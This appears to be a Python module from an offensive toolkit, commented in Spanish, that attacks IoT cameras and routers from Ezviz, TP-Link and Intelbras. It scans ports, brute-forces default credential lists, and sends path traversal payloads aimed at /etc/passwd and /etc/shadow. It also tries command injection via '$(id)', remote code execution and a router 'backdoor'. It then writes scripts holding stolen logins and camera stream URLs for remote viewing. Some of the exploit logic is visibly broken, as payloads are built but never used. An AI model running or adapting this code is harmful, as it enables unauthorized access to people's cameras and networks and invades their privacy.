"""
M√≥dulo de Explotaci√≥n de Dispositivos IoT y C√°maras IP
Incluye exploits espec√≠ficos para c√°maras, routers y otros dispositivos IoT
"""

import subprocess
import json
import time
import os
import requests
from typing import Dict, List, Any, Optional
from pathlib import Path
from modules.logging_system import LoggingSystem

class IoTExploitationModule:
    """M√≥dulo de explotaci√≥n de dispositivos IoT"""
    
    def __init__(self, config: Dict[str, Any], logger):
        self.config = config
        self.logger = logger
        self.logging_system = LoggingSystem(config, logger)
        
        # Resultados de explotaci√≥n IoT
        self.results = {
            'cameras_compromised': [],
            'routers_compromised': [],
            'iot_devices_compromised': [],
            'remote_access_established': [],
            'vulnerabilities_found': []
        }
        
        # Archivos de evidencia (ahora en scans/)
        self.evidence_dir = Path("scans/iot_exploitation")
        self.evidence_dir.mkdir(parents=True, exist_ok=True)
        
        # Mapeo de exploits por vendor
        self.vendor_exploits = {
            'Hangzhou Ezviz Software': {
                'default_credentials': [
                    {'user': 'admin', 'pass': 'admin'},
                    {'user': 'admin', 'pass': '12345'},
                    {'user': 'admin', 'pass': 'password'},
                    {'user': 'admin', 'pass': ''},
                    {'user': 'root', 'pass': 'root'},
                    {'user': 'user', 'pass': 'user'}
                ],
                'common_ports': [80, 8080, 554, 8554, 1935],
                'exploits': ['default_creds', 'path_traversal', 'rce']
            },
            'TP-Link PTE.': {
                'default_credentials': [
                    {'user': 'admin', 'pass': 'admin'},
                    {'user': 'admin', 'pass': 'password'},
                    {'user': 'root', 'pass': 'root'},
                    {'user': 'admin', 'pass': ''}
                ],
                'common_ports': [80, 8080, 443, 23, 21],
                'exploits': ['default_creds', 'command_injection', 'backdoor']
            },
            'Intelbras': {
                'default_credentials': [
                    {'user': 'admin', 'pass': 'admin'},
                    {'user': 'admin', 'pass': '123456'},
                    {'user': 'admin', 'pass': 'password'},
                    {'user': 'root', 'pass': 'root'}
                ],
                'common_ports': [80, 8080, 554, 8554],
                'exploits': ['default_creds', 'rce', 'path_traversal']
            }
        }
    
    def _run_command(self, command: List[str], timeout: int = 300) -> Dict[str, Any]:
        """Ejecutar comando y capturar salida"""
        try:
            self.logger.debug(f"üîß Ejecutando: {' '.join(command)}")
            
            result = subprocess.run(
                command,
                capture_output=True,
                text=True,
                timeout=timeout,
                encoding='utf-8',
                errors='replace'
            )
            
            self.logging_system.log_command(
                ' '.join(command),
                result.stdout + result.stderr,
                result.returncode,
                "IOT_EXPLOITATION"
            )
            
            return {
                'stdout': result.stdout,
                'stderr': result.stderr,
                'return_code': result.returncode,
                'success': result.returncode == 0
            }
                
        except subprocess.TimeoutExpired:
            self.logger.error(f"‚è∞ Timeout ejecutando: {' '.join(command)}")
            return {'stdout': '', 'stderr': 'Timeout', 'return_code': -1, 'success': False}
        except Exception as e:
            self.logger.error(f"‚ùå Error ejecutando comando: {e}")
            return {'stdout': '', 'stderr': str(e), 'return_code': -1, 'success': False}
    
    def exploit_iot_devices(self, discovered_hosts: List[Dict[str, Any]]) -> Dict[str, Any]:
        """Explotar dispositivos IoT descubiertos"""
        self.logger.info("üìπ INICIANDO EXPLOTACI√ìN DE DISPOSITIVOS IoT")
        
        start_time = time.time()
        
        try:
            # Filtrar dispositivos IoT por vendor
            iot_devices = self._filter_iot_devices(discovered_hosts)
            
            if not iot_devices:
                self.logger.info("‚ÑπÔ∏è No se encontraron dispositivos IoT para explotar")
                return self.results
            
            self.logger.info(f"üéØ Encontrados {len(iot_devices)} dispositivos IoT para explotar")
            
            for device in iot_devices:
                vendor = device.get('vendor', 'Unknown')
                ip = device['ip']
                
                self.logger.info(f"üìπ Explotando dispositivo {vendor} en {ip}")
                
                # Explotar por vendor
                if vendor in self.vendor_exploits:
                    self._exploit_by_vendor(device, vendor)
                else:
                    self._generic_iot_exploit(device)
            
            # Establecer acceso remoto a dispositivos comprometidos
            self._establish_remote_access()
            
            # Guardar evidencia
            self.logging_system.save_json_evidence(
                'iot_exploitation_results.json',
                self.results,
                'data'
            )
            
            end_time = time.time()
            duration = end_time - start_time
            
            self.logger.info(f"‚úÖ EXPLOTACI√ìN IoT COMPLETADA en {duration:.2f} segundos")
            self.logger.info(f"üìä Resumen: {len(self.results['cameras_compromised'])} c√°maras, {len(self.results['routers_compromised'])} routers")
            
            return self.results
            
        except Exception as e:
            self.logger.error(f"‚ùå Error en explotaci√≥n IoT: {e}")
            return self.results
    
    def _filter_iot_devices(self, hosts: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
        """Filtrar dispositivos IoT por vendor conocido"""
        iot_vendors = [
            'Hangzhou Ezviz Software', 'TP-Link PTE.', 'Intelbras',
            'D-Link', 'Netgear', 'Linksys', 'Cisco', 'Hikvision',
            'Dahua', 'Axis', 'Bosch', 'Samsung', 'Panasonic'
        ]
        
        iot_devices = []
        for host in hosts:
            vendor = host.get('vendor', '')
            if any(iot_vendor in vendor for iot_vendor in iot_vendors):
                iot_devices.append(host)
        
        return iot_devices
    
    def _exploit_by_vendor(self, device: Dict[str, Any], vendor: str):
        """Explotar dispositivo por vendor espec√≠fico"""
        ip = device['ip']
        vendor_config = self.vendor_exploits[vendor]
        
        # 1. Escanear puertos comunes
        open_ports = self._scan_iot_ports(ip, vendor_config['common_ports'])
        
        if not open_ports:
            self.logger.info(f"‚ùå No se encontraron puertos abiertos en {ip}")
            return
        
        # 2. Probar credenciales por defecto
        for port in open_ports:
            if port in [80, 8080, 443]:
                self._test_default_credentials(ip, port, vendor_config['default_credentials'])
        
        # 3. Ejecutar exploits espec√≠ficos
        for exploit in vendor_config['exploits']:
            if exploit == 'default_creds':
                continue  # Ya se prob√≥ arriba
            
            self._execute_vendor_exploit(ip, vendor, exploit, open_ports)
    
    def _scan_iot_ports(self, ip: str, common_ports: List[int]) -> List[int]:
        """Escanear puertos comunes de IoT"""
        self.logger.info(f"üîç Escaneando puertos IoT en {ip}")
        
        open_ports = []
        for port in common_ports:
            result = self._run_command(['nc', '-zv', ip, str(port)], timeout=5)
            if result['success']:
                open_ports.append(port)
                self.logger.info(f"‚úÖ Puerto {port} abierto en {ip}")
        
        return open_ports
    
    def _test_default_credentials(self, ip: str, port: int, credentials: List[Dict[str, str]]):
        """Probar credenciales por defecto"""
        self.logger.info(f"üîë Probando credenciales por defecto en {ip}:{port}")
        
        for cred in credentials:
            username = cred['user']
            password = cred['pass']
            
            # Probar HTTP b√°sico
            if self._test_http_auth(ip, port, username, password):
                self._log_successful_compromise(ip, port, username, password, 'default_credentials')
                return True
        
        return False
    
    def _test_http_auth(self, ip: str, port: int, username: str, password: str) -> bool:
        """Probar autenticaci√≥n HTTP b√°sica"""
        try:
            url = f"http://{ip}:{port}"
            response = requests.get(url, auth=(username, password), timeout=10)
            
            if response.status_code == 200:
                self.logger.info(f"‚úÖ Credenciales v√°lidas: {username}:{password} en {ip}:{port}")
                return True
                
        except Exception as e:
            self.logger.debug(f"Error probando credenciales en {ip}:{port}: {e}")
        
        return False
    
    def _execute_vendor_exploit(self, ip: str, vendor: str, exploit: str, open_ports: List[int]):
        """Ejecutar exploit espec√≠fico por vendor"""
        self.logger.info(f"üí• Ejecutando exploit {exploit} en {ip} ({vendor})")
        
        if vendor == 'Hangzhou Ezviz Software':
            self._exploit_ezviz_camera(ip, exploit, open_ports)
        elif vendor == 'TP-Link PTE.':
            self._exploit_tplink_device(ip, exploit, open_ports)
        elif vendor == 'Intelbras':
            self._exploit_intelbras_device(ip, exploit, open_ports)
    
    def _exploit_ezviz_camera(self, ip: str, exploit: str, open_ports: List[int]):
        """Explotar c√°mara Ezviz espec√≠ficamente"""
        if exploit == 'path_traversal':
            self._ezviz_path_traversal(ip, open_ports)
        elif exploit == 'rce':
            self._ezviz_rce(ip, open_ports)
    
    def _ezviz_path_traversal(self, ip: str, open_ports: List[int]):
        """Explotar path traversal en c√°maras Ezviz"""
        for port in open_ports:
            if port in [80, 8080]:
                # Payloads de path traversal comunes en Ezviz
                payloads = [
                    "../../../etc/passwd",
                    "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
                    "../../../proc/version",
                    "..\\..\\..\\boot.ini"
                ]
                
                for payload in payloads:
                    url = f"http://{ip}:{port}/cgi-bin/main-cgi?json={{\"cmd\":255,\"status\":1,\"flag\":1,\"type\":\"system\",\"user\":\"admin\",\"password\":\"admin\"}}"
                    
                    try:
                        response = requests.get(url, timeout=10)
                        if response.status_code == 200 and len(response.text) > 100:
                            self.logger.info(f"‚úÖ Path traversal exitoso en {ip}:{port}")
                            self._log_vulnerability(ip, port, 'path_traversal', 'ezviz', response.text[:500])
                            break
                    except:
                        continue
    
    def _ezviz_rce(self, ip: str, open_ports: List[int]):
        """Intentar RCE en c√°maras Ezviz"""
        for port in open_ports:
            if port in [80, 8080]:
                # Comando de prueba
                cmd = "id"
                url = f"http://{ip}:{port}/cgi-bin/main-cgi?json={{\"cmd\":255,\"status\":1,\"flag\":1,\"type\":\"system\",\"user\":\"admin\",\"password\":\"admin\",\"cmd\":\"{cmd}\"}}"
                
                try:
                    response = requests.get(url, timeout=10)
                    if "uid=" in response.text or "root" in response.text:
                        self.logger.info(f"‚úÖ RCE exitoso en {ip}:{port}")
                        self._log_vulnerability(ip, port, 'rce', 'ezviz', response.text[:500])
                except:
                    continue
    
    def _exploit_tplink_device(self, ip: str, exploit: str, open_ports: List[int]):
        """Explotar dispositivos TP-Link"""
        if exploit == 'command_injection':
            self._tplink_command_injection(ip, open_ports)
        elif exploit == 'backdoor':
            self._tplink_backdoor(ip, open_ports)
    
    def _tplink_command_injection(self, ip: str, open_ports: List[int]):
        """Explotar command injection en TP-Link"""
        for port in open_ports:
            if port in [80, 8080]:
                # Payloads de command injection
                payloads = [
                    "ping -c 1 127.0.0.1; id",
                    "ping -c 1 127.0.0.1 && id",
                    "ping -c 1 127.0.0.1 | id"
                ]
                
                for payload in payloads:
                    url = f"http://{ip}:{port}/cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id)"
                    
                    try:
                        response = requests.get(url, timeout=10)
                        if "uid=" in response.text:
                            self.logger.info(f"‚úÖ Command injection exitoso en {ip}:{port}")
                            self._log_vulnerability(ip, port, 'command_injection', 'tplink', response.text[:500])
                            break
                    except:
                        continue
    
    def _tplink_backdoor(self, ip: str, open_ports: List[int]):
        """Explotar backdoor en TP-Link"""
        for port in open_ports:
            if port in [80, 8080]:
                # Backdoor conocido en TP-Link
                url = f"http://{ip}:{port}/cgi-bin/luci/;stok=/locale?form=country&operation=write&country=US"
                
                try:
                    response = requests.get(url, timeout=10)
                    if response.status_code == 200:
                        self.logger.info(f"‚úÖ Backdoor accesible en {ip}:{port}")
                        self._log_vulnerability(ip, port, 'backdoor', 'tplink', response.text[:500])
                except:
                    continue
    
    def _exploit_intelbras_device(self, ip: str, exploit: str, open_ports: List[int]):
        """Explotar dispositivos Intelbras"""
        if exploit == 'rce':
            self._intelbras_rce(ip, open_ports)
        elif exploit == 'path_traversal':
            self._intelbras_path_traversal(ip, open_ports)
    
    def _intelbras_rce(self, ip: str, open_ports: List[int]):
        """Intentar RCE en Intelbras"""
        for port in open_ports:
            if port in [80, 8080]:
                url = f"http://{ip}:{port}/cgi-bin/main-cgi?json={{\"cmd\":255,\"status\":1,\"flag\":1,\"type\":\"system\",\"user\":\"admin\",\"password\":\"admin\"}}"
                
                try:
                    response = requests.get(url, timeout=10)
                    if response.status_code == 200:
                        self.logger.info(f"‚úÖ Acceso a sistema Intelbras en {ip}:{port}")
                        self._log_vulnerability(ip, port, 'system_access', 'intelbras', response.text[:500])
                except:
                    continue
    
    def _intelbras_path_traversal(self, ip: str, open_ports: List[int]):
        """Path traversal en Intelbras"""
        for port in open_ports:
            if port in [80, 8080]:
                payloads = [
                    "../../../etc/passwd",
                    "../../../proc/version",
                    "../../../etc/shadow"
                ]
                
                for payload in payloads:
                    url = f"http://{ip}:{port}/cgi-bin/main-cgi?json={{\"cmd\":255,\"status\":1,\"flag\":1,\"type\":\"system\",\"user\":\"admin\",\"password\":\"admin\",\"file\":\"{payload}\"}}"
                    
                    try:
                        response = requests.get(url, timeout=10)
                        if "root:" in response.text or "bin:" in response.text:
                            self.logger.info(f"‚úÖ Path traversal exitoso en {ip}:{port}")
                            self._log_vulnerability(ip, port, 'path_traversal', 'intelbras', response.text[:500])
                            break
                    except:
                        continue
    
    def _generic_iot_exploit(self, device: Dict[str, Any]):
        """Explotaci√≥n gen√©rica para dispositivos IoT desconocidos"""
        ip = device['ip']
        self.logger.info(f"üîç Explotaci√≥n gen√©rica en {ip}")
        
        # Escanear puertos comunes de IoT
        common_ports = [80, 8080, 443, 554, 8554, 23, 21, 22, 161, 162]
        open_ports = self._scan_iot_ports(ip, common_ports)
        
        if open_ports:
            # Probar credenciales gen√©ricas
            generic_creds = [
                {'user': 'admin', 'pass': 'admin'},
                {'user': 'admin', 'pass': 'password'},
                {'user': 'admin', 'pass': '12345'},
                {'user': 'root', 'pass': 'root'},
                {'user': 'admin', 'pass': ''}
            ]
            
            for port in open_ports:
                if port in [80, 8080, 443]:
                    self._test_default_credentials(ip, port, generic_creds)
    
    def _establish_remote_access(self):
        """Establecer acceso remoto a dispositivos comprometidos"""
        self.logger.info("üîó Estableciendo acceso remoto a dispositivos IoT...")
        
        for camera in self.results['cameras_compromised']:
            self._setup_camera_remote_access(camera)
        
        for router in self.results['routers_compromised']:
            self._setup_router_remote_access(router)
    
    def _setup_camera_remote_access(self, camera: Dict[str, Any]):
        """Configurar acceso remoto a c√°mara"""
        ip = camera['ip']
        port = camera['port']
        username = camera['username']
        password = camera['password']
        
        # Crear script de acceso remoto
        access_script = self.evidence_dir / f"camera_access_{ip}.sh"
        with open(access_script, 'w') as f:
            f.write("#!/bin/bash\n")
            f.write(f"# Acceso remoto a c√°mara {ip}\n")
            f.write(f"echo 'Accediendo a c√°mara {ip}:{port}'\n")
            f.write(f"echo 'Usuario: {username}'\n")
            f.write(f"echo 'Contrase√±a: {password}'\n")
            f.write(f"echo 'URL: http://{ip}:{port}'\n")
            f.write(f"echo 'Stream RTSP: rtsp://{username}:{password}@{ip}:554/stream1'\n")
            f.write(f"echo 'Stream RTSP (alternativo): rtsp://{username}:{password}@{ip}:8554/stream1'\n")
            f.write(f"\n# Abrir en navegador\n")
            f.write(f"xdg-open http://{ip}:{port}\n")
            f.write(f"\n# Reproducir stream con VLC\n")
            f.write(f"# vlc rtsp://{username}:{password}@{ip}:554/stream1\n")
        
        # Hacer ejecutable
        os.chmod(access_script, 0o755)
        
        remote_access = {
            'device_type': 'camera',
            'ip': ip,
            'port': port,
            'username': username,
            'password': password,
            'web_interface': f"http://{ip}:{port}",
            'rtsp_stream': f"rtsp://{username}:{password}@{ip}:554/stream1",
            'access_script': str(access_script),
            'timestamp': time.time()
        }
        
        self.results['remote_access_established'].append(remote_access)
        self.logger.info(f"‚úÖ Acceso remoto configurado para c√°mara {ip}")
    
    def _setup_router_remote_access(self, router: Dict[str, Any]):
        """Configurar acceso remoto a router"""
        ip = router['ip']
        port = router['port']
        username = router['username']
        password = router['password']
        
        # Crear script de acceso remoto
        access_script = self.evidence_dir / f"router_access_{ip}.sh"
        with open(access_script, 'w') as f:
            f.write("#!/bin/bash\n")
            f.write(f"# Acceso remoto a router {ip}\n")
            f.write(f"echo 'Accediendo a router {ip}:{port}'\n")
            f.write(f"echo 'Usuario: {username}'\n")
            f.write(f"echo 'Contrase√±a: {password}'\n")
            f.write(f"echo 'URL: http://{ip}:{port}'\n")
            f.write(f"\n# Abrir en navegador\n")
            f.write(f"xdg-open http://{ip}:{port}\n")
            f.write(f"\n# SSH si est√° disponible\n")
            f.write(f"# ssh {username}@{ip}\n")
        
        # Hacer ejecutable
        os.chmod(access_script, 0o755)
        
        remote_access = {
            'device_type': 'router',
            'ip': ip,
            'port': port,
            'username': username,
            'password': password,
            'web_interface': f"http://{ip}:{port}",
            'access_script': str(access_script),
            'timestamp': time.time()
        }
        
        self.results['remote_access_established'].append(remote_access)
        self.logger.info(f"‚úÖ Acceso remoto configurado para router {ip}")
    
    def _log_successful_compromise(self, ip: str, port: int, username: str, password: str, method: str):
        """Registrar compromiso exitoso"""
        device_type = 'camera' if 'ezviz' in ip.lower() or 'camera' in method else 'router'
        
        compromise_info = {
            'ip': ip,
            'port': port,
            'username': username,
            'password': password,
            'method': method,
            'device_type': device_type,
            'timestamp': time.time()
        }
        
        if device_type == 'camera':
            self.results['cameras_compromised'].append(compromise_info)
        else:
            self.results['routers_compromised'].append(compromise_info)
        
        self.logging_system.log_compromise(
            ip, f"IOT_{method.upper()}", compromise_info, "IOT_EXPLOITATION"
        )
    
    def _log_vulnerability(self, ip: str, port: int, vuln_type: str, vendor: str, evidence: str):
        """Registrar vulnerabilidad encontrada"""
        vuln_info = {
            'ip': ip,
            'port': port,
            'vulnerability_type': vuln_type,
            'vendor': vendor,
            'evidence': evidence,
            'timestamp': time.time()
        }
        
        self.results['vulnerabilities_found'].append(vuln_info)
        
        self.logging_system.log_compromise(
            ip, f"IOT_{vuln_type.upper()}", vuln_info, "IOT_EXPLOITATION"
        )
    
    def run(self) -> Dict[str, Any]:
        """Ejecutar m√≥dulo completo de explotaci√≥n IoT"""
        self.logger.info("üöÄ INICIANDO M√ìDULO DE EXPLOTACI√ìN IoT")
        
        # En un escenario real, los hosts vendr√≠an del m√≥dulo de reconocimiento
        # Por ahora usamos datos de ejemplo basados en el reporte
        discovered_hosts = [
            {
                'ip': '192.168.1.218',
                'vendor': 'Hangzhou Ezviz Software',
                'mac': '34:C6:DD:B4:97:4F'
            },
            {
                'ip': '192.168.1.241',
                'vendor': 'TP-Link PTE.',
                'mac': '98:25:4A:CA:14:52'
            },
            {
                'ip': '192.168.1.243',
                'vendor': 'Intelbras',
                'mac': '80:85:44:5C:CD:BC'
            }
        ]
        
        return self.exploit_iot_devices(discovered_hosts)
